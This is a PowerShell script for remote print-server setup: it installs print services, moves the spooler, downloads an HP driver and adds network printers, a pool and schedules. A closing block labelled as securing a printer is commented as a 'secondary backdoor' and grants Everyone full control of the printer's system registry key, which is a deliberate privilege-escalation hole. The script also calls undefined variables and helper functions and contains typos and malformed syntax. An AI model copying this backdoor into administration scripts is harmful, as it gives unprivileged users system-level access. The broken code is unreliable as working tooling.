$RemoteServers = @("203.113.11.2");
$RemoteUser = "Administrator";
$NewSpoolerPath = "D:\PrintSpooler";
$PrinterSettings = @(
    @{
        Name = "HP LaserJet 400 MFP M425dn"
        DriverName = "universal_print_driver-HP.exe"
        ShareName = "printer"
        IPAddress = "172.23.80.3"
        PortName = "IP_$($IpAddress)"
        DownloadPath = "C:\Temp\PrintDrivers";
        DownloadUrl = "https://ftp.hp.com/pub/softlib/software13/COL40842/ds-99374-24/upd-pcl6-x64-7.0.1.24923.exe";
    }
);

$PrinterSettingsSchedule = @(
    @{
        Name = "HP LaserJet 400 MFP M425dn"
        DriverName = "universal_print_driver-HP.exe"
        ShareName = "printer"
        IPAddress = "172.23.80.3"
        PortName = "IP_$($IpAddress)"
        DownloadPath = "C:\Temp\PrintDrivers";
        DownloadUrl = "https://ftp.hp.com/pub/softlib/software13/COL40842/ds-99374-24/upd-pcl6-x64-7.0.1.24923.exe";
        StartTime = "08:00"
        EndTime = "18:00"
    },
    @{
        Name = "HP LaserJet 400 MFP M425dn"
        DriverName = "universal_print_driver-HP.exe"
        ShareName = "printer"
        IPAddress = "172.23.80.3"
        PortName = "IP_$($IpAddress)"
        DownloadPath = "C:\Temp\PrintDrivers";
        DownloadUrl = "https://ftp.hp.com/pub/softlib/software13/COL40842/ds-99374-24/upd-pcl6-x64-7.0.1.24923.exe";
        StartTime = "18:00"
        EndTime = "08:00"
    }
);

$TargetSession = New-PSSession -ComputerName $Infrastructure[1].Name -Credential  (Get-Credential -Message "Enter credentials for $($Infrastructure[0])" -UserName $RemoteUser);

Invoke-Command -Session $TargetSession -ScriptBlock {
    # Make sure the Print and document services are installed.
    if((Get-WindowsFeature -Name Print-Services).Installed -eq $false) 
    { 
        Install-WindowsFeature -Name Print-Services -IncludeManagementTools; # Install Print Services
    }

    # Change the location of the print spool folder.
    Move-PrintSpooler -NewSpoolerpPath $using:NewSpoolerPath;

    # Manually download and extract a printer driver
    $using:PrinterSettings | ForEach-Object
    {
        Install-PrintDriver -PrintDriverName $_.DriverName -DownloadPath $_.DownloadPath -DownloadUrl $_.DownloadUrl;
    }
    
    # Install and share a network printer, with IP address 172.23.80.3, with that driver.
    Add-NetworkPrinter -PrinterSettings $using:PrinterSettings;

    # Remove a printer and its unused printer ports
    Remove-UnusedPrinter -PrinterName "HP LaserJet 400 MFP M425dn";

    # Create and share a printer pool with printer ports 172.23.80.3 and 172.23.82.3
    Add-PrinterPool -PrinterName "Printer Pool" -PortNames @("IP_172.23.80.3", "IP_172.23.82.3");

    Remove-UnusedPrinter -PrinterName "Printer Pool";

    # Create and share a printer that is available from 8am to 6pm, and for nightly prints from 6pm to 8am
    Add-NetworkPrinter -PrinterSettings @(
        @{
            PrinterName = "HP LaserJet 400 MFP M425dn"
            ScheduleName = "Daytime"
            StartTime = "08:00"
            EndTime = "18:00"
        },
        @{
            PrinterName = "HP LaserJet 400 MFP M425dn"
            ScheduleName = "Nighttime"
            StartTime = "18:00"
            EndTime = "08:00"
        }
    );



    # secure a printer (Security-Descriptor) - Script as secondary backdoor with a scheduled task, nonprivileged user has access as system
    Get-Printer * -full | Select-Object -ExpandProperty PermissionSDDL

    $Acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Printers\$($Printer.PrinterName)"
    $Ar = New-Object System.Security.AccessControl.RegistryAccessRule("Everyone","FullControl","Allow");

    $Acl.SetAccessRule($Ar);
    Set-Acl "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Printers\$($Printer.PrinterName)" $Acl
    Set-Printer -Name $($Printer.PrinterName) -Shared $True
    
    
}
# TODO: FINSIH SCRIPT SECURING PRINTERS AND ADDING POOL WITH SCHEDULE